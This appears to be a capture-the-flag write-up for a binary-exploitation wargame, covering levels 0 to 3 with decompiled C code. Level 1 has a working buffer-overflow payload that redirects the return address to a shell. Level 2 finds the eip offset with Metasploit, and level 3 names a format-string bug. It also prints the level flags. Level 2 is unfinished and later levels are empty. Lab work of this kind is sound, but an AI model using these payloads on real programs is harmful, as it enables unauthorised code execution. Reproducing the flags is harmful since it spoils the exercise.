---
tags: []
Links: []
Created: 2023-12-04 15:34
---
# level0

Simplified decompiled binary:

```c
int main(int argc,char *argv[])

{
  int iVar1;
  char *local_20;
  
  iVar1 = atoi(argv[1]);
  if (iVar1 == 423) {
    local_20 = strdup("/bin/sh");
    execv("/bin/sh",&local_20);
  }
  else {
    fwrite("No !\n",1,5,(FILE *)stderr);
  }
  return 0;
}
```

Here we see we have to access the `execve` to get a shell as `level1`, and we can do that by making sure `argv[1] = 423`.

So we can just do:

```bash
./level0 423
cat /home/user/level1/.pass
```

Flag: `1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a`

# level1

Decompiling the program we find a buffer overflow, since we use `gets` on a buffer with a limited size:
```c
void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}

void main(void)
{
  char local_50 [76];
  gets(local_50);
  return;
}
```

So what we can do here is changing the return address of the main in the stack, making it return to `run()` instead of the normal return.

We therefore need to find the address of `run()` with `objdump`: 
```bash
objdump -d level1
```

Output: 
```bash
08048444 <run>:
```

And transform it to little endian and hex format:
```
\x44\x84\x04\x08
```
Finally, we need to generate a big enough number of backfill characters to cause the overflow:
```bash
python -c 'print("A" * 76)'
```

The payload now looks like this:

```bash
python -c 'print("A" * 76 + b"\x44\x84\x04\x08")'
```

Last problem though, the shell opened is not interactive and returns immediately. We need to keep the ouput open using cat:
```bash
(python -c 'print("A" * 76 + b"\x44\x84\x04\x08")'; cat) | ./level1
```

Flag: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`

Reference: [Buffer Overflow Examples, Overwriting a function pointer - protostar stack3 - 0xRick’s Blog](https://0xrick.github.io/binary-exploitation/bof3/)
# level2

```c
void p(void)
{
  uint address;
  char local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if ((address & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",address);
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
  // shell code
}

void main(void)
{
  p();
  return;
}
```

On this level, we can see that we don't have any function susceptible to open us a shell. Time to inject shellcode !

Let's first determine what's the offset our program will crash at. For that purpose, we can use [[Metasploit]] tools:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

This will create a payload full of unique character sequences, which will help us determine the exact position our program crashed at. 

Reference: [Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5 - 0xRick’s Blog](https://0xrick.github.io/binary-exploitation/bof5/)

![[Pasted image 20231205125619.png]]

On the bottom, we can see the buffer address where the program crashed: `37634136`

We can therefore give it to another Metasploit program to determine the offset:

```bash
/usr/share/metasploit-framework/tools/exploit/./pattern_offset.rb -q 37634136
[*] Exact match at offset 80
```

We now need to find the address we want 

Now when we run the program with 80 characters, the behavior changes:

```bash
python -c "print ('A'*80 + '\x28\xf7\xff\xbf')" | ./level2 
(0xbffff728)
```

We can successfully overwrite `eip` here:

![[Pasted image 20231211133102.png]]

Now that we did that, we need to make sure `eip` points to somewhere in our shellcode. Since no [[ASLR]] happens here, we could just determine the address where our shellcode starts.

`492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`



# level3

```c
void v(void)
{
  char buffer [520];

  fgets(buffer,512,stdin);
  printf(buffer);
  if (m == 64) {
    fwrite("Wait what?!\n",1,12,stdout);
    system("/bin/sh");
  }
  return;
}

void main(void)
{
  v();
  return;
}
```

Address of m: `0x0804988c`

[Exploit 101 - Format Strings - BreakInSecurity](https://axcheron.github.io/exploit-101-format-strings/)

# level4

# level5

# level6

# level7

# level8

# level9